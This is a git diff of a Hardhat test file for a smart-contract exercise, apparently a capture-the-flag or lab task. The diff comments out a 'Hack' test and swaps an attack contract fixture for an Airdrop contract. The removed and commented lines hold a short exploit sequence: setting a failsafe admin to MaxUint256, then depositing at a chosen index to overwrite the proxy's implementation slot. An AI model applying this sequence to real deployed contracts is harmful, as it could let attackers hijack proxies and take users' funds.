@@ -1,6 +1,6 @@
 import { BigNumber, BigNumberish } from 'ethers'
 
-import { Buckets, BucketsProxy, Buckets__factory, BucketsAttack } from '../typechain'
+import { Buckets, BucketsProxy, Buckets__factory, BucketsAttack, Airdrop } from '../typechain'
 import { HARDHAT_ACCS_PUB_KEYS } from '../hardhat.config'
 
 import { expect } from 'chai'
@@ -12,12 +12,12 @@ import { BNToNumstr } from '../gotbit-tools/hardhat/extensions/bignumber'
 const nonExistentFuncSignature = 'nonExistentFunction(uint256,uint256)'
 
 async function setup() {
-  await deployments.fixture(['Buckets', 'BucketsProxy', 'BucketsAttack'])
+  await deployments.fixture(['Buckets', 'BucketsProxy', 'Airdrop'])
 
   const contracts = {
     buckets: (await ethers.getContract('Buckets')) as Buckets,
     proxy: (await ethers.getContract('BucketsProxy')) as BucketsProxy,
-    attack: (await ethers.getContract('BucketsAttack')) as BucketsAttack,
+    airdrop: (await ethers.getContract('Airdrop')) as Airdrop
   }
 
   const { deployer, backend, feeAddress } = await getNamedAccounts()
@@ -45,17 +45,22 @@ describe('Example unit test', () => {
   const token = BigNumber.from(10).pow(18)
   describe('Constructor', () => {
     it('Hack', async () => {
-      const { buckets, proxy, attack, deployer, backend, feeAddress, users } = await setup()
-      let bucketsContract = Buckets__factory.connect(proxy.address, await ethers.getSigner(users[0].address))
-      console.log(await ethers.provider.getStorageAt(bucketsContract.address, implementationSlot));
-      // console.log(await ethers.provider.getStorageAt(proxy.address, adminSlot));
-      await users[0].proxy.setFailsafeAdmin(ethers.constants.MaxUint256)
-      await bucketsContract.deposit(arrayIndexToCheck, {value: 1})
-      console.log(await ethers.provider.getStorageAt(bucketsContract.address, implementationSlot));
-      console.log(await bucketsContract.totalSupply());
+      const { buckets, proxy, airdrop, deployer, backend, feeAddress, users } = await setup()
+      // let bucketsContract = Buckets__factory.connect(proxy.address, await ethers.getSigner(users[0].address))
+      // console.log(await ethers.provider.getStorageAt(bucketsContract.address, implementationSlot));
+      // // console.log(await ethers.provider.getStorageAt(proxy.address, adminSlot));
+      // await users[0].proxy.setFailsafeAdmin(ethers.constants.MaxUint256)
+      // await bucketsContract.deposit(arrayIndexToCheck, {value: 1})
+      // console.log(await ethers.provider.getStorageAt(bucketsContract.address, implementationSlot));
+      // console.log(await bucketsContract.totalSupply());
+
+      // console.log(ethers.provider.getStorageAt(proxy.address, 0));
+      
       
       // await bucketsContract.deposit(1, {value: 5})
       // console.log(await ethers.provider.getStorageAt(proxy.address, adminSlot));
+
+      
     })
   })
 })
